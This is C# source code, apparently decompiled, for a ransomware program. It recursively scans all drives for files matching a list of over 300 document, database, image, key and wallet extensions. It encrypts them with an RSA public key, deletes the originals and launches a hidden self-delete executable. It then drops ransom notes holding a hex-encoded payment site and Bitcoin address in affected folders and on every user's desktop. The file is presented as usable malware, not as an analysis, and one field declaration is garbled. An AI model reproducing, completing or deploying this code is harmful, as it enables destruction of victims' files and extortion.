using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;

namespace SAM;

internal class Program
{
	private static string[] types = new string[328]
	{
		"xls", ".xlsx", ".pdf", ".doc", ".docx", ".ppt", ".pptx", ".txt", ".dwg", ".bak",
		".bkf", ".pst", ".dbx", ".zip", ".rar", ".mdb", ".asp", ".aspx", ".html", ".htm",
		".dbf", ".3dm", ".3ds", ".3fr", ".jar", ".3g2", ".xml", ".png", ".tif", ".3gp",
		".java", ".jpe", ".jpeg", ".jpg", ".jsp", ".php", ".3pr", ".7z", ".ab4", ".accdb",
		".accde", ".accdr", ".accdt", ".ach", ".kbx", ".acr", ".act", ".adb", ".ads", ".agdl",
		".ai", ".ait", ".al", ".apj", ".arw", ".asf", ".asm", ".asx", ".avi", ".awg",
		".back", ".backup", ".backupdb", ".pbl", ".bank", ".bay", ".bdb", ".bgt", ".bik", ".bkp",
		".blend", ".bpw", ".c", ".cdf", ".cdr", ".cdr3", ".cdr4", ".cdr5", ".cdr6", ".cdrw",
		".cdx", ".ce1", ".ce2", ".cer", ".cfp", ".cgm", ".cib", ".class", ".cls", ".cmt",
		".cpi", ".cpp", ".cr2", ".craw", ".crt", ".crw", ".phtml", ".php5", ".cs", ".csh",
		".csl", ".tib", ".csv", ".dac", ".db", ".db3", ".db-journal", ".dc2", ".dcr", ".dcs",
		".ddd", ".ddoc", ".ddrw", ".dds", ".der", ".des", ".design", ".dgc", ".djvu", ".dng",
		".dot", ".docm", ".dotm", ".dotx", ".drf", ".drw", ".dtd", ".dxb", ".dxf", ".dxg",
		".eml", ".eps", ".erbsql", ".erf", ".exf", ".fdb", ".ffd", ".fff", ".fh", ".fmb",
		".fhd", ".fla", ".flac", ".flv", ".fpx", ".fxg", ".gray", ".grey", ".gry", ".h",
		".hbk", ".hpp", ".ibank", ".ibd", ".ibz", ".idx", ".iif", ".iiq", ".incpas", ".indd",
		".kc2", ".kdbx", ".kdc", ".key", ".kpdx", ".lua", ".m", ".m4v", ".max", ".mdc",
		".mdf", ".mef", ".mfw", ".mmw", ".moneywell", ".mos", ".mov", ".mp3", ".mp4", ".mpg",
		".mrw", ".msg", ".myd", ".nd", ".ndd", ".nef", ".nk2", ".nop", ".nrw", ".ns2",
		".ns3", ".ns4", ".nsd", ".nsf", ".nsg", ".nsh", ".nwb", ".nx2", ".nxl", ".nyf",
		".oab", ".obj", ".odb", ".odc", ".odf", ".odg", ".odm", ".odp", ".ods", ".odt",
		".oil", ".orf", ".ost", ".otg", ".oth", ".otp", ".ots", ".ott", ".p12", ".p7b",
		".p7c", ".pab", ".pages", ".pas", ".pat", ".pcd", ".pct", ".pdb", ".pdd", ".pef",
		".pem", ".pfx", ".pl", ".plc", ".pot", ".potm", ".potx", ".ppam", ".pps", ".ppsm",
		".ppsx", ".pptm", ".prf", ".ps", ".psafe3", ".psd", ".pspimage", ".ptx", ".py", ".qba",
		".qbb", ".qbm", ".qbr", ".qbw", ".qbx", ".qby", ".r3d", ".raf", ".rat", ".raw",
		".rdb", ".rm", ".rtf", ".rw2", ".rwl", ".rwz", ".s3db", ".sas7bdat", ".say", ".sd0",
		".sda", ".sdf", ".sldm", ".sldx", ".sql", ".sqlite", ".sqlite3", ".sqlitedb", ".sr2", ".srf",
		".srt", ".srw", ".st4", ".st5", ".st6", ".st7", ".st8", ".std", ".sti", ".stw",
		".stx", ".svg", ".swf", ".sxc", ".sxd", ".sxg", ".sxi", ".sxi", ".sxm", ".sxw",
		".tex", ".tga", ".thm", ".tlg", ".vob", ".war", ".wallet", ".wav", ".wb2", ".wmv",
		".wpd", ".wps", ".x11", ".x3f", ".xis", ".xla", ".xlam", ".xlk", ".xlm", ".xlr",
		".xlsb", ".xlsm", ".xlt", ".xltm", ".xltx", ".xlw", ".ycbcra", ".yuv"
	};

	private static List<string> mylist250 = new List<string>();

	private static List<string> mylist500 = new List<string>();

	private static List<string> mylist1000 = new List<string>();

	private static List<string> mylistbig = new List<string>();

	private static List<string> openfiles = new List<string>();

	private static string comname = ToHexString(Environment.MachineName);

	private static string publickey = "";

	private static string currentdir = Directory.GetCurrentDirectory();

	private static string helpfile = "HELP_DECRYPT_YOUR_FILES";

	private static string helpfileext = ".html";

	private static string sfd = currentdir + "\\selfdel.exe";

	private static string ext_enc = ".encryptedRSA";

	private static string yourweb = "680074007400700073003A002F002F0070006100790066006F00720073006500630075007200650037002E0077006F0072006400700072006500730073002E0063006F006D00";

	private static string yourbtc = "31004A006E0078004C0052005100530048006B0043007700350061004500680075003500560051007000740055007100340058006D0078006E007400410076004C003200";

	private static string txthelpcomnameyourweb + "22003E00" + yourweb + "3C002F0061003E000D000A000D000A000D000A003C0066006F006E007400200063006F006C006F0072003D0022004400720061006B0052006500640022003E002A003C002F0066006F006E0074003E004F0075007200200042006900740063006F0069006E00200061006400640072006500730073003A002000" + yourbtccomname

	private static string sysdir = Path.GetPathRoot(Environment.SystemDirectory);

	private static void Main(string[] args)
	{
		if (args.Length != 1)
		{
			return;
		}
		if (!string.IsNullOrEmpty(args[0]))
		{
			publickey = File.ReadAllText(args[0]);
		}
		create_from_resource();
		Thread.Sleep(1000);
		Thread thread = new Thread(sld);
		thread.Start();
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			try
			{
				if (driveInfo.IsReady)
				{
					recursivegetfiles(driveInfo.Name);
				}
			}
			catch
			{
			}
		}
		if (mylist250.Count > 0)
		{
			foreach (string item in mylist250)
			{
				try
				{
					myeenncc(item);
				}
				catch
				{
				}
			}
			mylist250.Clear();
		}
		if (mylist500.Count > 0)
		{
			foreach (string item2 in mylist500)
			{
				try
				{
					myeenncc(item2);
				}
				catch
				{
				}
			}
			mylist500.Clear();
		}
		if (mylist1000.Count > 0)
		{
			foreach (string item3 in mylist1000)
			{
				try
				{
					myeenncc(item3);
				}
				catch
				{
				}
			}
		}
		if (mylistbig.Count > 0)
		{
			foreach (string item4 in mylistbig)
			{
				try
				{
					myeenncc(item4);
				}
				catch
				{
				}
			}
		}
		create_desk_file();
	}

	public static void myeenncc(string pathfile)
	{
		FileInfo fileInfo = new FileInfo(pathfile);
		try
		{
			DriveInfo driveInfo = new DriveInfo(pathfile);
			long availableFreeSpace = driveInfo.AvailableFreeSpace;
			long length = fileInfo.Length;
			if (length >= availableFreeSpace || new FileInfo(pathfile).Length <= 0L || File.Exists(fileInfo.DirectoryName + "\\" + fileInfo.Name + ext_enc) || string.IsNullOrEmpty(publickey))
			{
				return;
			}
			encryptFile(pathfile, publickey);
			if (!File.Exists(fileInfo.DirectoryName + "\\" + fileInfo.Name + ext_enc))
			{
				return;
			}
			FileInfo fileInfo2 = new FileInfo(fileInfo.DirectoryName + "\\" + fileInfo.Name + ext_enc);
			if (fileInfo2.Length > length)
			{
				fileInfo.Attributes = FileAttributes.Normal;
				File.Delete(pathfile);
				if (!File.Exists(pathfile))
				{
					File.WriteAllText(fileInfo.DirectoryName + "\\" + helpfile + helpfileext, FromHexString(txthelp));
				}
			}
		}
		catch (Exception)
		{
			if (File.Exists(fileInfo.DirectoryName + "\\" + fileInfo.Name + ext_enc))
			{
				File.Delete(fileInfo.DirectoryName + "\\" + fileInfo.Name + ext_enc);
			}
		}
	}

	public static bool islocked(string FileName)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = File.Open(FileName, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		}
		catch (UnauthorizedAccessException)
		{
			try
			{
				fileStream = File.Open(FileName, FileMode.Open, FileAccess.Read, FileShare.None);
			}
			catch (Exception)
			{
				return true;
			}
		}
		catch (Exception)
		{
			return true;
		}
		finally
		{
			fileStream?.Close();
		}
		return false;
	}

	public static string MakePath(string plainFilePath, string newSuffix)
	{
		string path = Path.GetFileNameWithoutExtension(plainFilePath) + newSuffix;
		return Path.Combine(Path.GetDirectoryName(plainFilePath), path);
	}

	public static string encryptFile(string plainFilePath, string publicKeyPath)
	{
		FileInfo fileInfo = new FileInfo(plainFilePath);
		string encryptedFilePath = MakePath(plainFilePath, fileInfo.Extension + ext_enc);
		string manifestFilePath = MakePath(plainFilePath, ".manifest.xml");
		return encc.Encrypt(plainFilePath, encryptedFilePath, manifestFilePath, publicKeyPath);
	}

	public static bool isValidFilePath(string strFilePath)
	{
		bool result = false;
		try
		{
			if (File.Exists(strFilePath))
			{
				result = true;
				return result;
			}
			return result;
		}
		catch (Exception)
		{
			return result;
		}
	}

	public static string ppee(string ff, string aaa)
	{
		string text = string.Empty;
		string text2 = string.Empty;
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(ff, aaa);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.StandardOutputEncoding = Encoding.GetEncoding("UTF-8");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process process = Process.Start(processStartInfo);
			using (StreamReader streamReader = process.StandardOutput)
			{
				text = streamReader.ReadToEnd();
			}
			using (StreamReader streamReader2 = process.StandardError)
			{
				text2 = streamReader2.ReadToEnd();
			}
			return text2 + text;
		}
		catch (Exception ex)
		{
			return ex.Message + "\n<------------>\n" + ex.StackTrace!.ToString();
		}
	}

	public static void sld()
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(sfd);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.StandardOutputEncoding = Encoding.GetEncoding("UTF-8");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process.Start(processStartInfo);
		}
		catch (Exception)
		{
		}
	}

	public static void recursivegetfiles(string path)
	{
		try
		{
			if (!(path != sysdir + "Windows") || path.Contains("Reference Assemblies\\Microsoft") || path.Contains("Recycle.Bin"))
			{
				return;
			}
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			FileInfo[] files = directoryInfo.GetFiles();
			string ext;
			foreach (FileInfo fileInfo in files)
			{
				try
				{
					ext = Path.GetExtension(fileInfo.FullName);
					long length = fileInfo.Length;
					if (!Array.Exists(types, (string element) => element == ext.ToLower()))
					{
						continue;
					}
					if (length <= 104857600L)
					{
						try
						{
							myeenncc(fileInfo.FullName);
						}
						catch
						{
						}
					}
					else if (104857600L < length && length <= 262144000L)
					{
						mylist250.Add(fileInfo.FullName);
					}
					else if (262144000L < length && length <= 524288000L)
					{
						mylist500.Add(fileInfo.FullName);
					}
					else if (524288000L < length && length <= 1048576000L)
					{
						mylist1000.Add(fileInfo.FullName);
					}
					else
					{
						mylistbig.Add(fileInfo.FullName);
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				try
				{
					recursivegetfiles(directoryInfo2.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
		}
		catch
		{
		}
	}

	public static void create_from_resource()
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		string[] manifestResourceNames = executingAssembly.GetManifestResourceNames();
		string[] array = manifestResourceNames;
		foreach (string text in array)
		{
			string[] array2 = text.Split(new char[1] { '.' });
			if (array2[2] == "exe")
			{
				if (File.Exists(currentdir + "\\" + array2[1] + "." + array2[2]))
				{
					File.Delete(currentdir + "\\" + array2[1] + "." + array2[2]);
				}
				FileStream fileStream = new FileStream(currentdir + "\\" + array2[1] + "." + array2[2], FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite);
				Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(text);
				byte[] buffer = new byte[4096];
				int count;
				while ((count = manifestResourceStream.Read(buffer, 0, 4096)) > 0)
				{
					fileStream.Write(buffer, 0, count);
				}
				fileStream.Close();
				manifestResourceStream.Close();
			}
		}
	}

	public static void create_desk_file()
	{
		string environmentVariable = Environment.GetEnvironmentVariable("userprofile");
		DirectoryInfo parent = Directory.GetParent(environmentVariable);
		string[] directories = Directory.GetDirectories(parent.FullName);
		string[] array = directories;
		foreach (string text in array)
		{
			if (!Directory.Exists(text + "\\Desktop"))
			{
				continue;
			}
			try
			{
				for (int j = 0; j < 10; j++)
				{
					File.WriteAllText(text + "\\Desktop\\" + helpfile + "_" + j + helpfileext, FromHexString(txthelp));
				}
			}
			catch (Exception)
			{
			}
		}
	}

	public static string Base64Encode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string Base64Decode(string base64EncodedData)
	{
		byte[] bytes = Convert.FromBase64String(base64EncodedData);
		return Encoding.UTF8.GetString(bytes);
	}

	public static string ToHexString(string str)
	{
		StringBuilder stringBuilder = new StringBuilder();
		byte[] bytes = Encoding.Unicode.GetBytes(str);
		byte[] array = bytes;
		foreach (byte b in array)
		{
			stringBuilder.Append(b.ToString("X2"));
		}
		return stringBuilder.ToString();
	}

	public static string FromHexString(string hexString)
	{
		byte[] array = new byte[hexString.Length / 2];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = Convert.ToByte(hexString.Substring(i * 2, 2), 16);
		}
		return Encoding.Unicode.GetString(array);
	}
}
